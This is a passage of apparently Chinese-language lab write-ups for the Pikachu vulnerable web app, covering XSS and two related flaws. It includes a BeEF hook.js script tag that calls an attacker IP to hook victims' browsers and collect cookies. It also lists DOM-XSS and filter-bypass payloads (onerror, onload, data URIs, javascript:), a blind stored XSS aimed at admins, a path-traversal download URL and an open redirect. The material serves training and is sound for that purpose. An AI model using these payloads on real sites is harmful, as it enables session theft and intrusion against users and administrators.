<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install beef-xss</span><br></pre></td></tr></table></figure>

<p><img src="/images%5C1660272799566-358ac5e0-a1d0-41e1-8baf-fddcd4d5bef0.png" alt="img"></p>
<p>登录进入后台，用户名为beef</p>
<p><img src="/images%5C1660272885067-9a84d647-c2e3-4e2f-a726-de1e9d91ccea.png" alt="img"></p>
<p>启动时命令行会给出web页面地址和攻击payload</p>
<p><img src="/images%5C1660273051219-eacadab3-5b6a-41e0-81a0-25102f9c3337.png" alt="img"></p>
<p>payload换上攻击机的ip地址，直接上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.28.153:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5C1660273246927-955ad279-5970-48da-aeea-f60169d3aa66.png" alt="img"></p>
<p>获取访问留言板的电脑的主机信息</p>
<p><img src="/images%5C1660273284160-d43efe33-735d-47ed-afd2-0fc84bd2a331.png" alt="img"></p>
<p>同样，换个虚拟机发起请求</p>
<p><img src="/images%5C1660273396042-19900f44-d5a1-43d4-b1e4-ea70fcf991c0.png" alt="img"></p>
<p>攻击机kali获取到主机信息</p>
<p><img src="/images%5C1660273432143-abf8f51a-aa13-4153-ba8c-92b64387d022.png" alt="img"></p>
<p>同样，如果只是反射型的xss，只要让受害者点击恶意链接，也可造成同样效果</p>
<p>可以使用反射型xss(get)进行试验，恶意链接如下：</p>
<p><a href="http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message=%3C/script%3E&submit=submit">http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message&#x3D;%3Cscript+src%3D%22http%3A%2F%2F192.168.28.153%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E&amp;submit&#x3D;submit</a></p>
<p>攻击机获取到主机信息</p>
<p><img src="/images%5C1660274095597-5d0a5c5d-ae55-4c06-9db9-cee2268a2fb8.png" alt="img"></p>
<h1 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h1><h2 id="DOM概述"><a href="#DOM概述" class="headerlink" title="DOM概述"></a>DOM概述</h2><p>简单来说，DOM文档就是一份XML文档，当有了DOM标准之后，DOM便将前端html代码化为一个树状结构，方便程序和脚本能够轻松的动态访问和更新这个树状结构的内容、结构以及样式，且不需要经过服务端，所以DOM型xss在js前端自己就可以完成数据的输入输出，不与服务器产生交互，这样来说DOM型xss也可以理解为反射性xss。</p>
<p>DOM XSS与反射性XSS、存储型XSS的主要区别在于DOM XSS的XSS代码不需要服务端解析响应的直接参与，触发XSS的是浏览器端的DOM解析。一般不与服务器交互，所以输入的payload也不会存储在服务器上。</p>
<p>但其实质是通过修改页面的DOM节点形成的xss，所以在后面的xss-x中，可以发现与服务器产生了交互，但是由于还是通过修改页面的DOM节点形成的xss，所以也归为dom型xss。</p>
<p>有关DOM的可以参考<a href="https://www.runoob.com/htmldom/htmldom-tutorial.html">https://www.runoob.com/htmldom/htmldom-tutorial.html</a></p>
<h3 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function test()&#123;</span><br><span class="line">	var str = document.getElementById(&quot;test&quot;).value;</span><br><span class="line">	document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&#x27;&quot;+str+&quot;&#x27; &gt;testLink&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;t&quot; &gt;&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;test&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot; onclick=&quot;test()&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>这段代码，就是将输入到id&#x3D;test的文本框的文本内容，点击write按钮后，执行test()函数，将输入的文本内容，放到a标签的href中显示到前端（<a href="xxxxxxxxxx">testLink</a>）</p>
<p><img src="/images%5C1662618457481-02526d36-c474-4b34-930a-88bcc7e994ad.png" alt="img"></p>
<p>随便输入一个hello world，点击write</p>
<p>可以发现源代码中出现一个a标签，href中就是我们输入的内容</p>
<p><img src="/images%5C1662618556441-26f7763e-33a1-44be-b399-e354008e787d.png" alt="img"></p>
<p>而且可以抓包，当我们点击write时，并不会抓到数据包，仅在前端html中输出</p>
<h3 id="插入payload"><a href="#插入payload" class="headerlink" title="插入payload"></a>插入payload</h3><p>由于可控点在a标签中的href属性，需要先将a标签闭合或使用事件触发</p>
<h5 id="事件触发"><a href="#事件触发" class="headerlink" title="事件触发"></a>事件触发</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(/xss/) //</span><br></pre></td></tr></table></figure>

<p>首先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后用注释符“&#x2F;&#x2F;”注释掉单引号。点击新生连接，脚本将被执行。</p>
<p><img src="/images%5C1662619049036-41394025-6721-467d-9b09-b15fde9a206b.png" alt="img"></p>
<h5 id="闭合a标签"><a href="#闭合a标签" class="headerlink" title="闭合a标签"></a>闭合a标签</h5><p>但使用<script></script>时并不会弹窗</p>
<p>a标签里并不解析<script>标签</p>
<p><img src="/images%5C1662621427146-b9300938-f2ee-4a3e-a152-fe2c26a4756e.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&gt;&lt;img src=# onerror=alert(/xss1/) /&gt;&lt;&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5C1662621081022-4933e3f5-efac-4491-900c-af86413897e9.png" alt="img"></p>
<h3 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h3><p>这段代码实现了一个简单的页面，允许用户输入昵称并在页面上显示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;DOM XSS Attack Demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Welcome!&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;Please enter your nickname:&lt;/p&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input id=&quot;nickname&quot; type=&quot;text&quot; /&gt;</span><br><span class="line">        &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;p&gt;Your nickname is: &lt;span id=&quot;display&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        const form = document.querySelector(&#x27;form&#x27;);</span><br><span class="line">        const nicknameInput = document.querySelector(&#x27;#nickname&#x27;);</span><br><span class="line">        const display = document.querySelector(&#x27;#display&#x27;);</span><br><span class="line"></span><br><span class="line">        form.addEventListener(&#x27;submit&#x27;, (event) =&gt; &#123;</span><br><span class="line">            event.preventDefault();</span><br><span class="line"></span><br><span class="line">            const nickname = nicknameInput.value;</span><br><span class="line">            display.innerHTML = nickname;</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>随便输入一串字符</p>
<p><img src="/images%5Cimage-20230107224210191.png" alt="image-20230107224210191"></p>
<p>抓包也没有与服务器交互</p>
<p>直接通过前端的js代码将输入框的东西输出到浏览器</p>
<h2 id="普通DOM型xss"><a href="#普通DOM型xss" class="headerlink" title="普通DOM型xss"></a>普通DOM型xss</h2><p><img src="/images%5C1660291585340-ecdca394-b111-4505-b7b3-f72b0df0f35e.png" alt="img"></p>
<p>由于其将输入的字符放进了html标签中的属性中，所以该类型xss攻击需要将标签闭合，并且加入自己的payload.</p>
<p>即下面的hello我们是可控的。需要通过将a标签闭合，或通过事件触发，再放入自己的恶意payload才可以造成xss</p>
<p><img src="/images%5C1660291862424-93c60fa9-14f7-4ffd-afa2-c890fdbba430.png" alt="img"></p>
<p>a标签可以接受onclick属性，表示点击行为，点击就触发</p>
<p>所以可以接上onclick=alert('xss')>把a的右标签也闭合了</p>
<p>所以payload为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5C1660295072228-82da965b-ff25-475a-bd72-5b2f350f3421.png" alt="img"></p>
<p><img src="/images%5C1660295264667-593a7c3d-8210-4392-bada-e495fbaeac13.png" alt="img"></p>
<p>点击弹窗</p>
<p><img src="/images%5C1660295272768-f1c011f0-8ce5-48f9-a308-440eef974a84.png" alt="img"></p>
<p>反正只要能凑上闭合，能解析，怎么样都行</p>
<h2 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>上述的dom型xss可以发现，输入的payload，并不与服务器交互，也不显示在url中。</p>
<p><img src="/images%5C1662622837438-afaae957-f195-46b4-b2df-57311da7e03c.png" alt="img"></p>
<p>dom型xss-x，可以发现url中存在输入的内容，可以将带有恶意payload的url发给被攻击者钓鱼</p>
<p><img src="/images%5C1662622629801-cb87a0c8-53ea-4fa5-ac4b-adb43578ca1d.png" alt="img"></p>
<p>从源码可以看出，输入到文本框的内容，会先通过get请求将内容发送到服务端</p>
<p><img src="/images%5C1662623756155-e22ac861-92b7-4ed3-8eae-d1db2cb8d455.png" alt="img"></p>
<p>服务端接收到get请求的内容，调用domxss()函数，通过修改页面的DOM节点形成新的html传回给客户端的浏览器，所以也归为为DOM XSS</p>
<p><img src="/images%5C1662624234083-f986c7ba-f92f-4f3f-a2f7-ec93690f21bf.png" alt="img"></p>
<p><img src="/images%5C1662624224148-501c0bca-1a61-49f1-badd-fb029a0f75e0.png" alt="img"></p>
<p>后续利用同DOM型xss</p>
<p>随便输入一串字符串，然后点击按钮，可以看出添加到了<a>标签中</p>
<p><img src="/images%5Cimage-20230107233737057.png" alt="image-20230107233737057"></p>
<p>同上题需要凑闭合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230107235014624.png" alt="image-20230107235014624"></p>
<h2 id="DOM型xss和传统XSS的区别"><a href="#DOM型xss和传统XSS的区别" class="headerlink" title="DOM型xss和传统XSS的区别"></a>DOM型xss和传统XSS的区别</h2><p>DOM型XSS是一种比较特殊的XSS攻击，它利用浏览器中的DOM（文档对象模型）漏洞来实现攻击。</p>
<p>1.DOM型XSS不依赖于服务器的输出</p>
<p>2.DOM型XSS攻击的源代码不会被服务器端的代码直接输出，而是通过浏览器的JavaScript代码在客户端进行解析和执行。</p>
<p>3.DOM型XSS攻击的攻击范围更广，可以通过各种手段（如邮件、聊天工具、社交媒体等）将攻击代码传递给用户，从而对用户的浏览器进行攻击。</p>
<p>4.不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom-xss是通过url传入参数去控制触发的。(可以看作是反射型的特殊情况)</p>
<p>与DOM型XSS相比，反射型XSS的区别在于：</p>
<p>1.反射型XSS依赖于服务器的输出</p>
<p>2.反射型XSS攻击的源代码会被服务器端的代码直接输出到浏览器端，然后在浏览器中执行。</p>
<p>3.反射型XSS攻击的攻击范围较小，通常是通过邮件、聊天工具或社交媒体将攻击链接发送给目标用户，让用户自己打开链接进行攻击。</p>
<p>总之，DOM型XSS攻击更加隐蔽，而反射型XSS攻击更容易被发现，但两者都可能对用户造成严重的安全威胁。</p>
<h1 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h1><p><img src="/images%5Cimage-20230108191822262.png" alt="image-20230108191822262"></p>
<p>需要绕过过滤</p>
<p>经过尝试，该题过滤的是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script</span><br></pre></td></tr></table></figure>

<p>当遇到<script时会直接被去除</p>
<p><img src="/images%5Cimage-20230108203249590.png" alt="image-20230108203249590"></p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>下面会列举几个绕过的方式，要是有其他的方式自行查阅</p>
<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sCript&gt;&lt;/sCriPt&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230108212120454.png" alt="image-20230108212120454"></p>
<p>可以看到成功解析为<script>标签</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sCrIPT&gt;alert(123)&lt;/sCrIPt&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230108211941551.png" alt="image-20230108211941551"></p>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>题目可以发现<script会被去除，所以可以用来构造payload</p>
<p>双写绕过原理很简单，可以做个测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello&lt;scriptWorld</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230108213754256.png" alt="image-20230108213754256"></p>
<p>可以看到<script被去掉，剩下来HelloWorld</p>
<p>当过滤规则只替换一次且是替换为空<script时，就可以使用双写绕过</p>
<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello&lt;scri&lt;scriptptWorld</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230108220509951.png" alt="image-20230108220509951"></p>
<p>可以看到该题并不能使用简单的双写绕过，需要配合其他绕过方式</p>
<h3 id="各类标签绕过"><a href="#各类标签绕过" class="headerlink" title="各类标签绕过"></a>各类标签绕过</h3><h4 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h4><p>除了<script></script>还可以使用其他的标签进行利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=alert(123)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=alert(`1`);&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=alert(`1`)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;1&quot; onerror=&#x27;alert(1)&#x27;;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;1&quot; onerror=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>该payload表示当img调用src的图片失败，则触发onerror行为，执行alert(123)</p>
<p><img src="/images%5Cimage-20230108222853591.png" alt="image-20230108222853591"></p>
<h4 id="SVG标签"><a href="#SVG标签" class="headerlink" title="SVG标签"></a>SVG标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=alert(1)&gt;&lt;/svg&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=alert(`1`)&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230108224804638.png" alt="image-20230108224804638"></p>
<h4 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&quot; onclick=alert(123)&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109085110147.png" alt="image-20230109085110147"></p>
<p>点击后触发</p>
<p><img src="/images%5Cimage-20230109085127282.png" alt="image-20230109085127282"></p>
<h4 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus=alert(123)&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>onfocus表示鼠标放上去触发</p>
<p><img src="/images%5Cimage-20230109085300848.png" alt="image-20230109085300848"></p>
<h4 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=alert(123)&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=alert(123)&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=alert(123);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p>onload:当页面加载完毕时执行代码</p>
<p><img src="/images%5Cimage-20230109085540498.png" alt="image-20230109085540498"></p>
<h4 id="audio标签"><a href="#audio标签" class="headerlink" title="audio标签"></a>audio标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;audio src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109090052786.png" alt="image-20230109090052786"></p>
<p><img src="/images%5Cimage-20230109090104388.png" alt="image-20230109090104388"></p>
<h4 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a>video标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;video src=x onerror=alert(111)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109090247285.png" alt="image-20230109090247285"></p>
<h4 id="button标签"><a href="#button标签" class="headerlink" title="button标签"></a>button标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button onfocus=alert(1)&gt;</span><br><span class="line">&lt;button onclick=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>onclick点击触发</p>
<p><img src="/images%5Cimage-20230109090328767.png" alt="image-20230109090328767"></p>
<h4 id="object标签"><a href="#object标签" class="headerlink" title="object标签"></a>object标签</h4><p>该标签需要配合data:&#x2F;&#x2F;text伪协议利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxMjMpPC9zY3JpcHQ+&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109090507237.png" alt="image-20230109090507237"></p>
<p><img src="/images%5Cimage-20230109090547150.png" alt="image-20230109090547150"></p>
<p><img src="/images%5Cimage-20230109090602207.png" alt="image-20230109090602207"></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>还有其他的绕过方式，比如其他的标签，实体编码绕过，闭合等方式，可自行查阅搭建靶场进行绕过，后续题目也会涉及。</p>
<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/E3G5juHSQjzRNSZcgiTmQA">https://mp.weixin.qq.com/s/E3G5juHSQjzRNSZcgiTmQA</a></p>
<p><a href="https://www.freebuf.com/articles/web/339348.html">https://www.freebuf.com/articles/web/339348.html</a></p>
<h1 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h1><p>根据提示输入tmac</p>
<p><img src="/images%5Cimage-20230109094736189.png" alt="image-20230109094736189"></p>
<p>前端查看js代码</p>
<p><img src="/images%5Cimage-20230109094912346.png" alt="image-20230109094912346"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	$ms=&#x27;tmac&#x27;;</span><br><span class="line">    if($ms.length != 0)&#123;</span><br><span class="line">        if($ms == &#x27;tmac&#x27;)&#123;</span><br><span class="line">            $(&#x27;#fromjs&#x27;).text(&#x27;tmac确实厉害,看那小眼神..&#x27;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">//            alert($ms);</span><br><span class="line">            $(&#x27;#fromjs&#x27;).text(&#x27;无论如何不要放弃心中所爱..&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再随便输入一串字符</p>
<p><img src="/images%5Cimage-20230109095120480.png" alt="image-20230109095120480"></p>
<p>传入的字符会被放进该$ms，于是我们就可以构造闭合</p>
<h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>先使用</script>闭合前面的<script>，再执行自己的payload</p>
<p><img src="/images%5Cimage-20230109095418811.png" alt="image-20230109095418811"></p>
<p>这些题的逻辑都类似，找闭合，绕过过滤，绕过实体转换</p>
<h1 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h1><p>盲打指的是一种攻击场景</p>
<p>在留言框或姓名中插入Payload测试，根据提示登录到后台查看留言的信息，直接触发XSS</p>
<p>先随便输入一些内容</p>
<p><img src="/images%5Cimage-20230108023741293.png" alt="image-20230108023741293"></p>
<p>提示给出了后台地址</p>
<p><img src="/images%5Cimage-20230108023827084.png" alt="image-20230108023827084"></p>
<p>根据提示登录</p>
<p><img src="/images%5Cimage-20230108024052825.png" alt="image-20230108024052825"></p>
<p>可以看到我们输入的内容</p>
<p><img src="/images%5Cimage-20230108024128492.png" alt="image-20230108024128492"></p>
<p>该场景叫做盲打也是因为这个，插入xss payload后，我们只能等待管理员点击从而利用</p>
<p>数据库中能够看到插入的payload</p>
<p><img src="/images%5Cimage-20230108030928953.png" alt="image-20230108030928953"></p>
<p>所以也属于存储型XSS</p>
<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>这里可以用之前的BEEF平台进行利用</p>
<p>这里先使用alert弹窗进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(111)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230108025041967.png" alt="image-20230108025041967"></p>
<p>当管理员登录后台后，就会出现弹窗</p>
<p><img src="/images%5Cimage-20230108025123698.png" alt="image-20230108025123698"></p>
<p>pikachu有自己的XSS平台</p>
<p><img src="/images%5Cimage-20230108030049268.png" alt="image-20230108030049268"></p>
<p>需要提前配置数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pikachu\inc\config.inc.php</span><br></pre></td></tr></table></figure>

<p>安装初始化即可</p>
<p><img src="/images%5Cimage-20230108030444690.png" alt="image-20230108030444690"></p>
<p>这里我们使用beef进行测试</p>
<p>具体使用在《BeEF xss利用框架安装使用.md》中有说明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.28.150:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230108170625920.png" alt="image-20230108170625920"></p>
<p>管理员登录到后台后</p>
<p>可以看到beef这边已有主机信息，包括cookie等</p>
<p><img src="/images%5Cimage-20230108170850091.png" alt="image-20230108170850091"></p>
<h1 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h1><p>该题如果输出的信息为<a href="http://www.baidu.com时则正常输出,反之则将输入的值使用htmlspecialchars()函数进行转换/">www.baidu.com时则正常输出，反之则将输入的值使用htmlspecialchars()函数进行转换</a></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&quot;&lt;&gt;#?</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109094424113.png" alt="image-20230109094424113"></p>
<p>可以发现压根没有闭合等，输入啥就是啥</p>
<h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p>可以使用javascript协议来执行js，当点击超链接时会执行该js脚本实现弹窗</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(123)</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109094619596.png" alt="image-20230109094619596"></p>
<p>点击触发</p>
<p><img src="/images%5Cimage-20230109094603430.png" alt="image-20230109094603430"></p>
<h2 id="javascript协议"><a href="#javascript协议" class="headerlink" title="javascript协议"></a>javascript协议</h2><p>将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中。</p>
<p>这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(123)</span><br></pre></td></tr></table></figure>

<p>实际上是将javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。</p>
<h1 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h1><p>主要是对htmlspecialchars()函数进行绕过</p>
<p>htmlspecialchars()是PHP里面把预定义的字符转换为HTML实体的函数</p>
<p><img src="/images%5Cimage-20230109091304591.png" alt="image-20230109091304591"></p>
<h2 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&quot;&lt;&gt;#?</span><br></pre></td></tr></table></figure>

<p>注意需要先用一个单引号将href的双引号闭合后才能看出结果</p>
<p><img src="/images%5Cimage-20230109092023309.png" alt="image-20230109092023309"></p>
<p>根据上方返回的信息可以看到字符双引号，<，>都被转换成了HTML实体函数(默认不对'进行处理)</p>
<h2 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h2><p>寻找闭合，避开被转换的字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(123) &#x27;</span><br></pre></td></tr></table></figure>

<p>点击触发</p>
<p><img src="/images%5Cimage-20230109092702680.png" alt="image-20230109092702680"></p>
<h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/escape-w/p/10162831.html">https://www.cnblogs.com/escape-w/p/10162831.html</a></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-不安全的文件下载</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当存在文件下载功能时，如果没有做好限制，则可能会造成任意文件下载，源码泄露等严重后果</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>抓取下载功能的数据包</p>
<p><img src="/images%5Cimage-20230110105403955.png" alt="image-20230110105403955"></p>
<p>文件下载的url为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=mbl.png</span><br></pre></td></tr></table></figure>

<p>如果未做好限制，则会造成任意文件下载</p>
<h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../index.php</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110105601275.png" alt="image-20230110105601275"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-不安全的URL跳转</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
    <content><![CDATA[<p>如果后端采用了前端传进来的参数作为跳转的目的地，又没有做判断就可能跳转到钓鱼网站等恶意链接。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/images%5Cimage-20230110155041071.png" alt="image-20230110155041071"></p>
<p>点击最后一个参数</p>
<p>获取url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=i</span><br></pre></td></tr></table></figure>

<p>url指定重定向后的网页</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure>

<p>重定向到百度</p>
<p><img src="/images%5Cimage-20230110155158474.png" alt="image-20230110155158474"></p>
<p>可以抓个包看看</p>
<p><img src="/images%5Cimage-20230110155246615.png" alt="image-20230110155246615"></p>
<p>可以看到302响应包中的location字段指向百度</p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-文件上传</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
